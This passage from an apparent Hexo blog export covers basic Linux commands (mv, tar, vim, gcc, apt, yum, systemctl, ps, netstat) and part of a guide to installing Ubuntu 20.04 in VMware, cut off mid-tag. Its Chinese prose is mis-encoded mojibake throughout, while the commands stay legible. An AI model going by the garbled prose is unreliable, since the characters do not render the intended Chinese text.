dir1/dir2</code>ï¼Œè¡¨ç¤ºåœ¨å½“å‰ç›®å½•ä¸‹çš„dir1ç›®å½•ä¸­åˆ é™¤dir2å­ç›®å½•ï¼Œè‹¥åˆ é™¤dir2ådir1å˜ä¸ºç©ºç›®å½•ï¼Œåˆ™ä¹Ÿå°†å…¶åˆ é™¤ã€‚</p><h2 id="mv-ç§»åŠ¨æˆ–é‡å‘½åæ–‡ä»¶å‘½ä»¤"><a href="#mv-ç§»åŠ¨æˆ–é‡å‘½åæ–‡ä»¶å‘½ä»¤" class="headerlink" title="mv ç§»åŠ¨æˆ–é‡å‘½åæ–‡ä»¶å‘½ä»¤"></a>mv ç§»åŠ¨æˆ–é‡å‘½åæ–‡ä»¶å‘½ä»¤</h2><p>æ ¼å¼ï¼šmv [é€‰é¡¹] &lt;æºæ–‡ä»¶æˆ–ç›®å½•&gt; &lt;ç›®çš„æ–‡ä»¶æˆ–ç›®å½•&gt;</p><p>è¯¥å‘½ä»¤ç”¨äºå¯¹ä¸€ä¸ªæ–‡ä»¶æˆ–ç›®å½•è¿›è¡Œé‡å‘½åæˆ–å°†å‡ ä¸ªæ–‡ä»¶ç§»åˆ°å¦ä¸€ç›®å½•ã€‚ä¸»è¦é€‰é¡¹å¦‚ä¸‹ï¼š</p><p>-fï¼šå¼ºåˆ¶ç§»åŠ¨,è‹¥ç›®æ ‡ç›®å½•ä¸‹æœ‰åŒåçš„æ–‡ä»¶åˆ™è¦†ç›–å®ƒã€‚</p><p>ä¾‹å¦‚ï¼šæ‰§è¡Œå‘½ä»¤<code>mv test.c program.c</code>ï¼Œåˆ™å°†å½“å‰ç›®å½•ä¸‹çš„test.cæ–‡ä»¶é‡å‘½åä¸ºprogram.cã€‚</p><h1 id="å‹ç¼©å‘½ä»¤"><a href="#å‹ç¼©å‘½ä»¤" class="headerlink" title="å‹ç¼©å‘½ä»¤"></a>å‹ç¼©å‘½ä»¤</h1><p>ä¸ºäº†å‡å°ä¼ è¾“æ–‡ä»¶çš„å¤§å°ï¼Œä¸€èˆ¬éƒ½å¼€å¯å‹ç¼©ã€‚linuxä¸‹å¸¸è§çš„å‹ç¼©æ–‡ä»¶æœ‰tarã€bzip2ã€zipã€rarç­‰ï¼Œ7zè¿™ç§ç”¨çš„ç›¸å¯¹è¾ƒå°‘ã€‚</p><p><strong>.tar</strong> ä½¿ç”¨tarå‘½ä»¤å‹ç¼©æˆ–è§£å‹</p><p><strong>.bz2</strong> ä½¿ç”¨bzip2å‘½ä»¤æ“ä½œ</p><p><strong>.gz</strong> ä½¿ç”¨gzipå‘½ä»¤æ“ä½œ</p><p><strong>.zip</strong> ä½¿ç”¨unzipå‘½ä»¤è§£å‹</p><p><strong>.rar</strong> ä½¿ç”¨unrarå‘½ä»¤è§£å‹</p><p>æœ€å¸¸ç”¨çš„å°±æ˜¯<code>.tar.gz</code>æ–‡ä»¶æ ¼å¼äº†ã€‚å…¶å®æ˜¯ç»è¿‡äº†taræ‰“åŒ…åï¼Œå†ä½¿ç”¨gzipå‹ç¼©ã€‚</p><p>åˆ›å»ºå‹ç¼©æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf test.tar.gz ./</span><br></pre></td></tr></table></figure><p>è§£å‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf test.tar.gz</span><br></pre></td></tr></table></figure><h1 id="vi-vimç¼–è¾‘å™¨çš„ç®€å•ä½¿ç”¨"><a href="#vi-vimç¼–è¾‘å™¨çš„ç®€å•ä½¿ç”¨" class="headerlink" title="vi/vimç¼–è¾‘å™¨çš„ç®€å•ä½¿ç”¨"></a>vi/vimç¼–è¾‘å™¨çš„ç®€å•ä½¿ç”¨</h1><p>Vi (visual interface) æ˜¯Linuxä¸Šä¸»è¦çš„æ–‡æœ¬ç¼–è¾‘è½¯ä»¶ã€‚å®ƒå¯ä»¥è¿›è¡Œæ–‡æœ¬è¾“å…¥ã€åˆ é™¤ã€æŸ¥æ‰¾ã€æ›¿æ¢ã€å—æ“ä½œç­‰è¯¸å¤šæ–‡æœ¬æ“ä½œã€‚ä½†æ˜¯ç›®å‰æˆ‘ä»¬ä½¿ç”¨æ¯”è¾ƒå¤šçš„æ˜¯ vim ç¼–è¾‘å™¨ï¼ˆviçš„å¢å¼ºç‰ˆï¼‰ã€‚vim å…·æœ‰ç¨‹åºç¼–è¾‘çš„èƒ½åŠ›ï¼Œå¯ä»¥ä¸»åŠ¨çš„ä»¥å­—ä½“é¢œè‰²è¾¨åˆ«è¯­æ³•çš„æ­£ç¡®æ€§ï¼Œæ–¹ä¾¿ç¨‹åºè®¾è®¡ã€‚åŸºæœ¬æ“ä½œå¦‚ä¸‹å›¾ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/RGqJFMW1HsA5L76.png" alt="image-20210208112035571"></p><h1 id="gcc-ç¼–è¯‘å™¨çš„ç®€å•ä½¿ç”¨"><a href="#gcc-ç¼–è¯‘å™¨çš„ç®€å•ä½¿ç”¨" class="headerlink" title="gcc ç¼–è¯‘å™¨çš„ç®€å•ä½¿ç”¨"></a>gcc ç¼–è¯‘å™¨çš„ç®€å•ä½¿ç”¨</h1><p>Linux ä¸‹æœ€å¸¸ç”¨çš„C è¯­è¨€ç¼–è¯‘å™¨æ˜¯ gcc (GNU Compiler Collection)ã€‚</p><p>ç¼–è¯‘è¿‡ç¨‹ï¼š</p><p>ï¼ˆ1ï¼‰é¢„å¤„ç†</p><p>ï¼ˆ2ï¼‰ç¼–è¯‘</p><p>ï¼ˆ3ï¼‰æ±‡ç¼–</p><p>ï¼ˆ4ï¼‰é“¾æ¥</p><p>æºæ–‡ä»¶ test.c ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ test å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -o <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæœªæŒ‡å®šæ–‡ä»¶åï¼Œé»˜è®¤ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ <code>a.out</code> </p><h1 id="apt-å‘½ä»¤ä¸-yum-å‘½ä»¤"><a href="#apt-å‘½ä»¤ä¸-yum-å‘½ä»¤" class="headerlink" title="apt å‘½ä»¤ä¸ yum å‘½ä»¤"></a>apt å‘½ä»¤ä¸ yum å‘½ä»¤</h1><blockquote><p>aptï¼ˆAdvanced Packaging Toolï¼‰æ˜¯ä¸€ä¸ªåœ¨ Debian å’Œ Ubuntu ä¸­çš„ Shell å‰ç«¯è½¯ä»¶åŒ…ç®¡ç†å™¨ã€‚</p><p>apt å‘½ä»¤æ‰§è¡Œéœ€è¦è¶…çº§ç®¡ç†å‘˜æƒé™(root)ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su root <span class="comment">#suå‘½ä»¤ç”¨äºåˆ‡æ¢ç”¨æˆ·</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="apt-è¯­æ³•"><a href="#apt-è¯­æ³•" class="headerlink" title="apt è¯­æ³•"></a>apt è¯­æ³•</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt [options] [<span class="built_in">command</span>] [package ...]</span><br></pre></td></tr></table></figure><ul><li><strong>optionsï¼š</strong>å¯é€‰ï¼Œé€‰é¡¹åŒ…æ‹¬ -hï¼ˆå¸®åŠ©ï¼‰ï¼Œ-yï¼ˆå½“å®‰è£…è¿‡ç¨‹æç¤ºé€‰æ‹©å…¨éƒ¨ä¸ºâ€yesâ€ï¼‰ï¼Œ-qï¼ˆä¸æ˜¾ç¤ºå®‰è£…çš„è¿‡ç¨‹ï¼‰ç­‰ç­‰ã€‚</li><li><strong>commandï¼š</strong>è¦è¿›è¡Œçš„æ“ä½œã€‚</li><li><strong>package</strong>ï¼šå®‰è£…çš„åŒ…åã€‚</li></ul><h2 id="apt-å¸¸ç”¨å‘½ä»¤"><a href="#apt-å¸¸ç”¨å‘½ä»¤" class="headerlink" title="apt å¸¸ç”¨å‘½ä»¤"></a>apt å¸¸ç”¨å‘½ä»¤</h2><ul><li><p>åˆ—å‡ºæ‰€æœ‰å¯æ›´æ–°çš„è½¯ä»¶æ¸…å•å‘½ä»¤ï¼š<strong>sudo apt update</strong></p></li><li><p>å‡çº§è½¯ä»¶åŒ…ï¼š<strong>sudo apt upgrade</strong></p></li><li><p>å®‰è£…æŒ‡å®šçš„è½¯ä»¶å‘½ä»¤ï¼š<strong>sudo apt install <package_name></strong></p><p>å®‰è£…å¤šä¸ªè½¯ä»¶åŒ…ï¼š<strong>sudo apt install <package_1> <package_2> <package_3></strong></p></li><li><p>æ›´æ–°æŒ‡å®šçš„è½¯ä»¶å‘½ä»¤ï¼š<strong>sudo apt update <package_name></strong></p></li><li><p>æ˜¾ç¤ºè½¯ä»¶åŒ…å…·ä½“ä¿¡æ¯,ä¾‹å¦‚ï¼šç‰ˆæœ¬å·ï¼Œå®‰è£…å¤§å°ï¼Œä¾èµ–å…³ç³»ç­‰ç­‰ï¼š<strong>sudo apt show <package_name></strong></p></li><li><p>åˆ é™¤è½¯ä»¶åŒ…å‘½ä»¤ï¼š<strong>sudo apt remove <package_name></strong></p></li><li><p>æ¸…ç†ä¸å†ä½¿ç”¨çš„ä¾èµ–å’Œåº“æ–‡ä»¶: <strong>sudo apt autoremove</strong></p></li><li><p>ç§»é™¤è½¯ä»¶åŒ…åŠé…ç½®æ–‡ä»¶: <strong>sudo apt purge <package_name></strong></p></li><li><p>åˆ—å‡ºæ‰€æœ‰å·²å®‰è£…çš„åŒ…ï¼š<strong>apt list â€“installed</strong></p></li><li><p>åˆ—å‡ºæ‰€æœ‰å·²å®‰è£…çš„åŒ…çš„ç‰ˆæœ¬ä¿¡æ¯ï¼š<strong>apt list â€“all-versions</strong></p></li></ul><blockquote><p>yumï¼ˆ Yellow dog Updater, Modifiedï¼‰æ˜¯ä¸€ä¸ªåœ¨ Fedoraã€CentOSå’Œ RedHat ä»¥åŠ SUSE ä¸­çš„ Shell å‰ç«¯è½¯ä»¶åŒ…ç®¡ç†å™¨ã€‚</p><p>åŸºäº RPM åŒ…ç®¡ç†ï¼Œèƒ½å¤Ÿä»æŒ‡å®šçš„æœåŠ¡å™¨è‡ªåŠ¨ä¸‹è½½ RPM åŒ…å¹¶ä¸”å®‰è£…ï¼Œå¯ä»¥è‡ªåŠ¨å¤„ç†ä¾èµ–æ€§å…³ç³»ï¼Œå¹¶ä¸”ä¸€æ¬¡å®‰è£…æ‰€æœ‰ä¾èµ–çš„è½¯ä½“åŒ…ï¼Œæ— é¡»ç¹çåœ°ä¸€æ¬¡æ¬¡ä¸‹è½½ã€å®‰è£…ã€‚</p></blockquote><h2 id="yum-è¯­æ³•"><a href="#yum-è¯­æ³•" class="headerlink" title="yum è¯­æ³•"></a>yum è¯­æ³•</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum [options] [command] [package ...]</span><br></pre></td></tr></table></figure><ul><li><strong>optionsï¼š</strong>å¯é€‰ï¼Œé€‰é¡¹åŒ…æ‹¬-hï¼ˆå¸®åŠ©ï¼‰ï¼Œ-yï¼ˆå½“å®‰è£…è¿‡ç¨‹æç¤ºé€‰æ‹©å…¨éƒ¨ä¸º â€œyesâ€ï¼‰ï¼Œ-qï¼ˆä¸æ˜¾ç¤ºå®‰è£…çš„è¿‡ç¨‹ï¼‰ç­‰ç­‰ã€‚</li><li><strong>commandï¼š</strong>è¦è¿›è¡Œçš„æ“ä½œã€‚</li><li><strong>packageï¼š</strong>å®‰è£…çš„åŒ…åã€‚</li></ul><h2 id="yum-å¸¸ç”¨å‘½ä»¤"><a href="#yum-å¸¸ç”¨å‘½ä»¤" class="headerlink" title="yum å¸¸ç”¨å‘½ä»¤"></a>yum å¸¸ç”¨å‘½ä»¤</h2><ul><li>åˆ—å‡ºæ‰€æœ‰å¯æ›´æ–°çš„è½¯ä»¶æ¸…å•å‘½ä»¤ï¼š<strong>yum check-update</strong></li><li>æ›´æ–°æ‰€æœ‰è½¯ä»¶å‘½ä»¤ï¼š<strong>yum update</strong></li><li>ä»…å®‰è£…æŒ‡å®šçš„è½¯ä»¶å‘½ä»¤ï¼š<strong>yum install <package_name></strong></li><li>ä»…æ›´æ–°æŒ‡å®šçš„è½¯ä»¶å‘½ä»¤ï¼š<strong>yum update <package_name></strong></li><li>åˆ é™¤è½¯ä»¶åŒ…å‘½ä»¤ï¼š<strong>yum remove <package_name></strong></li><li>æ¸…é™¤ç¼“å­˜å‘½ä»¤ï¼š <strong>yum clean all</strong> </li></ul><h1 id="æœåŠ¡ç›¸å…³å‘½ä»¤"><a href="#æœåŠ¡ç›¸å…³å‘½ä»¤" class="headerlink" title="æœåŠ¡ç›¸å…³å‘½ä»¤"></a>æœåŠ¡ç›¸å…³å‘½ä»¤</h1><ul><li><code>systemctl start apache2</code> (<code>service apache2 start</code>) å¯åŠ¨apacheæœåŠ¡</li><li><code>systemctl stop apache2</code>(<code>service apache2 stop</code>) åœæ­¢apacheæœåŠ¡</li><li><code>systemctl restart apache2</code> (<code>service apache2 restart</code>) é‡å¯apacheæœåŠ¡</li><li><code>systemctl status apache2</code> (<code>service apache2 status</code>) æŸ¥çœ‹apacheè¿è¡ŒçŠ¶æ€</li><li><code>systemctl enable apache2.service   </code> è®¾ä¸ºå¼€æœºè‡ªåŠ¨è¿è¡ŒæœåŠ¡</li><li><code>systemctl disable apache2.service      </code> å–æ¶ˆå¼€æœºè‡ªåŠ¨è¿è¡ŒæœåŠ¡</li></ul><h1 id="æŸ¥çœ‹ç³»ç»ŸçŠ¶æ€å‘½ä»¤"><a href="#æŸ¥çœ‹ç³»ç»ŸçŠ¶æ€å‘½ä»¤" class="headerlink" title="æŸ¥çœ‹ç³»ç»ŸçŠ¶æ€å‘½ä»¤"></a>æŸ¥çœ‹ç³»ç»ŸçŠ¶æ€å‘½ä»¤</h1><p>ç™»é™†ä¸€å°linuxæœºå™¨ï¼Œæœ‰äº›å‘½ä»¤èƒ½å¤Ÿå¸®åŠ©ä½ å¿«é€Ÿæ‰¾åˆ°é—®é¢˜ã€‚è¿™äº›å‘½ä»¤æ¶µç›–å†…å­˜ã€cpuã€ç½‘ç»œã€ioã€ç£ç›˜ç­‰ã€‚</p><ul><li><code>uname</code>å‘½ä»¤å¯ä»¥è¾“å‡ºå½“å‰çš„å†…æ ¸ä¿¡æ¯ï¼Œè®©ä½ äº†è§£åˆ°ç”¨çš„æ˜¯ä»€ä¹ˆæœºå™¨ã€‚</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux linux 5.4.0-58-generic <span class="comment">#64-Ubuntu SMP Wed Dec 9 08:16:25 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure><ul><li><code>ps</code>å‘½ä»¤èƒ½å¤Ÿçœ‹åˆ°è¿›ç¨‹/çº¿ç¨‹çŠ¶æ€ã€‚</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ‰¾åˆ°javaè¿›ç¨‹</span></span><br><span class="line">ps -ef|grep java</span><br></pre></td></tr></table></figure><ul><li><code>top</code>ç³»ç»ŸçŠ¶æ€ä¸€è§ˆï¼Œä¸»è¦æŸ¥çœ‹cpu loadè´Ÿè½½ã€cpuå ç”¨ç‡ï¼Œä½¿ç”¨å†…å­˜æˆ–è€…cpuæœ€é«˜çš„ä¸€äº›è¿›ç¨‹ã€‚</li><li><code>df</code>å‘½ä»¤ç”¨æ¥æŸ¥çœ‹ç³»ç»Ÿä¸­ç£ç›˜çš„ä½¿ç”¨é‡ï¼Œç”¨æ¥æŸ¥çœ‹ç£ç›˜æ˜¯å¦å·²ç»åˆ°è¾¾ä¸Šé™ã€‚<code>df -h</code>å¯ä»¥ä»¥å‹å¥½çš„æ–¹å¼è¿›è¡Œå±•ç¤ºã€‚</li><li><code>ifconfig</code> æŸ¥çœ‹ipåœ°å€</li><li><code>ping</code> æ£€æµ‹ç½‘ç»œè¿æ¥</li><li><code>netstat</code>è™½ç„¶<code>ss</code>å‘½ä»¤å¯ä»¥æ›¿ä»£<code>netstat</code>äº†ï¼Œä½†ç°å®ä¸­netstatä»ç„¶ç”¨çš„æ›´å¹¿æ³›ä¸€äº›ã€‚æ¯”å¦‚ï¼ŒæŸ¥çœ‹å½“å‰çš„æ‰€æœ‰tcpè¿æ¥ã€‚</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æŸ¥æ‰¾æœ¬åœ°ç«¯å£ç›¸å…³</span></span><br><span class="line">netstat -ant </span><br></pre></td></tr></table></figure><hr><p>å¾…è¡¥å……ã€‚ã€‚ã€‚</p><blockquote><p>å‚è€ƒèµ„æ–™ï¼š</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI4MDEwNzAzNg==&mid=2649451542&idx=1&sn=d49f71ee4d00fda3e366dc9ad1a40028&chksm=f3a24d65c4d5c473073259d0902bca1fff65c2ee94116643bb2f3764dc3f789396760d99ce09&mpshare=1&scene=23&srcid=0119KZZGVA1O4x64iOgBcCQG&sharer_sharetime=1613318033634&sharer_shareid=0682904b850da48c54cd507e190afd60#rd">çœ‹å®Œè¿™ç¯‡ä½ ä¸€å®šèƒ½æŒæ¡Linuxï¼ˆéå¹¿å‘Šï¼‰</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu20.04å®‰è£…è®°å½•</title>
      <link href="posts/2811.html"/>
      <url>posts/2811.html</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä»æ‰‹æœºï¼Œåˆ°æœåŠ¡å™¨ä¸Šå¹¿æ³›ä½¿ç”¨çš„<code>centos</code>ï¼Œåˆ°æ¼‚äº®çš„æ¡Œé¢å‘è¡Œç‰ˆ<code>ubuntu</code>ï¼Œç”šè‡³æ˜¯é£é¡å…¨çƒçš„<code>æ ‘è“æ´¾</code>ï¼Œåˆ°å¤„éƒ½æ˜¯linuxçš„èº«å½±ã€‚Linuxç³»ç»Ÿçš„å‘è¡Œç‰ˆæœ¬ä¼—å¤šï¼Œå¦‚åŸºäºç¤¾åŒºå¼€å‘çš„debianã€archlinuxï¼Œå’ŒåŸºäºå•†ä¸šå¼€å‘çš„Red Hat Enterprise Linuxã€SUSEã€Oracle Linuxç­‰ã€‚è¿™é‡Œé€‰æ‹©åŸºäºdebianå‘è¡Œç‰ˆå’Œgnomeæ¡Œé¢ç¯å¢ƒçš„Ubuntu è¿›è¡Œå®‰è£…ä½“éªŒã€‚</p><h1 id="å®‰è£…VMwareè™šæ‹Ÿæœº"><a href="#å®‰è£…VMwareè™šæ‹Ÿæœº" class="headerlink" title="å®‰è£…VMwareè™šæ‹Ÿæœº"></a>å®‰è£…VMwareè™šæ‹Ÿæœº</h1><p>æ’é™¤æ‰å®ä½“æœºå’ŒåŒç³»ç»Ÿçš„è¿è¡Œæ–¹å¼ï¼Œè¿™é‡Œé€‰æ‹©åœ¨è™šæ‹Ÿæœºä¸Šè¿è¡ŒLinuxç³»ç»Ÿã€‚</p><p>å‰å¾€ <a href="https://www.vmware.com/">å®˜ç½‘</a> ä¸‹è½½Vmwareè™šæ‹Ÿæœºè½¯ä»¶</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/DzHwdn3cAE85r14.png" alt="image-20201115160332451"></p><p>é€‰æ‹©VMware Workstation Pro 16.0 for Windowsä¸‹è½½ï¼ˆå½“å‰æœ€æ–°ç‰ˆï¼‰</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/uKN3eWxZvnDcHFE.png" alt="image-20201115233840538"></p><p>ä¸‹è½½å¥½åé€‰æ‹©ä½ç½®é»˜è®¤å®‰è£…å³å¯ã€‚</p><h1 id="å®‰è£…Ubuntuç³»ç»Ÿ"><a href="#å®‰è£…Ubuntuç³»ç»Ÿ" class="headerlink" title="å®‰è£…Ubuntuç³»ç»Ÿ"></a>å®‰è£…Ubuntuç³»ç»Ÿ</h1><h2 id="ä¸‹è½½é•œåƒæ–‡ä»¶"><a href="#ä¸‹è½½é•œåƒæ–‡ä»¶" class="headerlink" title="ä¸‹è½½é•œåƒæ–‡ä»¶"></a>ä¸‹è½½é•œåƒæ–‡ä»¶</h2><p>ç‰ˆæœ¬é€‰æ‹©ï¼šubuntu 20.04.1 LTS  <a href="https://ubuntu.com/download/desktop">https://ubuntu.com/download/desktop</a></p><p>ä¸‹è½½é€Ÿåº¦æ…¢çš„è¯å¯ä»¥åœ¨ä¸­ç§‘å¤§æºä¸‹è½½  <a href="http://mirrors.ustc.edu.cn/">http://mirrors.ustc.edu.cn/</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/LtSJsK5iMAx7pwB.png" alt="image-20201115155320583"></p><h2 id="åˆ›å»ºUbuntuè™šæ‹Ÿæœº"><a href="#åˆ›å»ºUbuntuè™šæ‹Ÿæœº" class="headerlink" title="åˆ›å»ºUbuntuè™šæ‹Ÿæœº"></a>åˆ›å»ºUbuntuè™šæ‹Ÿæœº</h2><p>æ‰“å¼€vmwareï¼Œé€‰æ‹©åˆ›å»ºæ–°çš„è™šæ‹Ÿæœº</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/sAEG7QtKn1VpFPu.png"></p><p>é€‰æ‹©è‡ªå®šä¹‰</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/9AQZcTNPCKwLIyj.png"></p><p>é€‰æ‹©ç¨åå®‰è£…æ“ä½œç³»ç»Ÿ</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/XkqDy5OlRbdjFsC.png" alt="image-20201116000036529"></p><p>é€‰æ‹©Linuxï¼Œubuntu 64ä½</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/l6ijyQ9JOaZbn5m.png" alt="image-20210214233038803"></p><p>æ ¹æ®ç”µè„‘é…ç½®é€‰æ‹©å¤„ç†å™¨æ•°é‡ï¼Œè¿™é‡Œä¸»æœºæ˜¯å…«æ ¸å¤„ç†å™¨ï¼Œæ•°é‡é€‰æ‹©å¦‚ä¸‹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/EnyZA9Hztg1dkav.png" alt="image-20201116000356510"></p><p>é€‰æ‹©å†…å­˜å¤§å°</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/u8zUF9r3mcEikew.png" alt="image-20201116000607760"></p><p>ç½‘ç»œç±»å‹ï¼ŒI/Oæ§åˆ¶å™¨ç±»å‹ï¼Œç£ç›˜ç±»å‹ï¼Œç£ç›˜é€‰æ‹©é»˜è®¤å³å¯</p><p>ç£ç›˜å¤§å°é€‰æ‹©</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/aY6USWJkV2FMd1K.png" alt="image-20201116000919973"></p><p>æŒ‡å®šç£ç›˜æ–‡ä»¶é»˜è®¤å³å¯</p><p>é€‰æ‹©è‡ªå®šä¹‰ç¡¬ä»¶</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/ICp4WovQNLgwfhJ.png" alt="image-20201116001105197"></p><p>å®Œæˆä¸‹åˆ—æ“ä½œåå…³é—­</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/nImLyf2QxO8whrY.png" alt="image-20201116001519587"></p><h2 id="å¼€å¯Ubuntu"><a href="#å¼€å¯Ubuntu" class="headerlink" title="å¼€å¯Ubuntu"></a>å¼€å¯Ubuntu</h2><p>å¼€å¯æ­¤è™šæ‹Ÿæœº</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/wD5JBGOqYdAozV7.png" alt="image-20201116001750169"></p><p>ç¨ä½œç­‰å¾…è‡³Install</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/49SrsLCKF2oDJWc.png" alt="image-20201116002343400"></p><p>continue</p><p>Install Now</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/U8YJpZNzCwnq6ht.png" alt="image-20201116002715987"></p><p>continue</p><p>é€‰æ‹©åœ°åŒº</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/wOvuteENrPfJndX.png" alt="image-20201116002811568"></p><p>è®¾ç½®ç”¨æˆ·åå’Œå¯†ç </p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/Si7dgGltbWzqDrK.png" alt="image-20201116002948041"></p><p>ç­‰å¾…ç³»ç»Ÿç›¸å…³é…ç½®</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/NsE1MP8TKf3ilLC.png" alt="image-20201116003202060"></p><p>restarté‡å¯</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/biNThdJmnZR7u8L.png" alt="image-20201116003825147"></p><p>ä½¿ç”¨åˆšæ‰åˆ›å»ºçš„è´¦æˆ·ç™»å½•</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/QDU7ByJXNYEMCKz.png" alt="image-20201116004426112"></p><p>Skip</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/LVQ12ilHdPXMEqp.png" alt="image-20201116004531824"></p><p>Nextâ€¦</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/6WrVKNH9IcumfXQ.png" alt="image-20201116004603633"></p><p>åˆ°æ­¤å¯ä»¥çœ‹åˆ°Ubuntuæ¡Œé¢äº†</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/PU12Ew3kDmZs85H.png" alt="image-20201116004750134"></p><h2 id="å®‰è£…VMware-Tools"><a href="#å®‰è£…VMware-Tools" class="headerlink" title="å®‰è£…VMware Tools"></a>å®‰è£…VMware Tools</h2><blockquote><p>VMware Toolsä½œç”¨:</p><p>å¯ä»¥åœ¨æœ¬æœºå’Œè™šæ‹Ÿæœºä¹‹é—´æ‹–æ‹½æ–‡ä»¶</p><p>ä½¿è™šæ‹Ÿæœºçš„å±å¹•å……æ»¡VMware Workstationçš„çª—å£</p></blockquote><p>1ã€é€‰æ‹©â€œè™šæ‹Ÿæœºâ€ -&gt; â€œå®‰è£…VMware Toolsâ€ï¼Œè¿™é‡Œå·²ç»å®‰è£…è¿‡äº†ï¼Œæ‰€ä»¥æ˜¾ç¤ºç°è‰²</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/UIajiyv9pGWwcDV.png" alt="image-20210215015014854"></p><p>2ã€ç‚¹å‡»åå¯ä»¥åœ¨æ¡Œé¢çœ‹åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œæ‰“å¼€ç»ˆç«¯æŠŠå‹ç¼©åŒ…è§£å‹åˆ°æŸä¸ªè·¯å¾„ã€‚</p><p>3ã€è§£å‹å®Œä¹‹åï¼Œè¿›å…¥è§£å‹è·¯å¾„ï¼Œå°±ä¼šçœ‹VMware Toolsçš„å®‰è£…åŒ…ã€‚</p><p>4ã€è¿›å…¥å®‰è£…åŒ…ï¼Œæ‰“å¼€ç»ˆç«¯ï¼Œæ‰§è¡Œå®‰è£…ç¨‹åºã€‚</p><p>5ã€å¼€å§‹å®‰è£…ä¹‹åè§åˆ°yesï¼Œå°±è¾“å…¥yesã€‚å…¶ä»–çš„å°±ä¸€è·¯å›è½¦æŒ‰ï¼ˆEnterï¼‰ç›´åˆ°å‡ºç°â€œEnjoy, â€“the VMware teamâ€å°±è¡¨ç¤ºå®‰è£…æˆåŠŸäº†ï¼Œç„¶åæ‰‹åŠ¨é‡å¯è™šæ‹Ÿæœºï¼Œè™šæ‹Ÿæœºçš„å±å¹•å°±å……æ»¡VMware Workstationsçš„çª—å£äº†ã€‚</p><p>è¯¦æƒ…å¯è§è¿™ç¯‡<a href="https://blog.csdn.net/engerla/article/details/83009677">æ–‡ç« </a></p><h2 id="æ›´æ¢é•œåƒæº"><a href="#æ›´æ¢é•œåƒæº" class="headerlink" title="æ›´æ¢é•œåƒæº"></a>æ›´æ¢é•œåƒæº</h2><p>ç”¨é»˜è®¤çš„é•œåƒæºå¯èƒ½ä¼šå¯¼è‡´ä¸‹è½½é€Ÿåº¦è¿‡æ…¢ï¼Œæœ‰å¿…è¦æ›´æ¢å›½å†…çš„é•œåƒæºã€‚</p><p>è¿›å…¥è½¯ä»¶ Software &amp; Updates è¿›è¡Œæ›´æ¢</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/ea3suvftd8kbRP5.png" alt="image-20210215020614139">  </p><p>åœ¨ Download from ä¸€æ ä¸­é€‰æ‹©Othersï¼Œæ‰¾åˆ° Chinaï¼Œé€‰æ‹©å›½å†…çš„é•œåƒæºï¼Œè¿™é‡Œé€‰æ‹©é˜¿é‡Œäº‘ã€‚</p><p><img 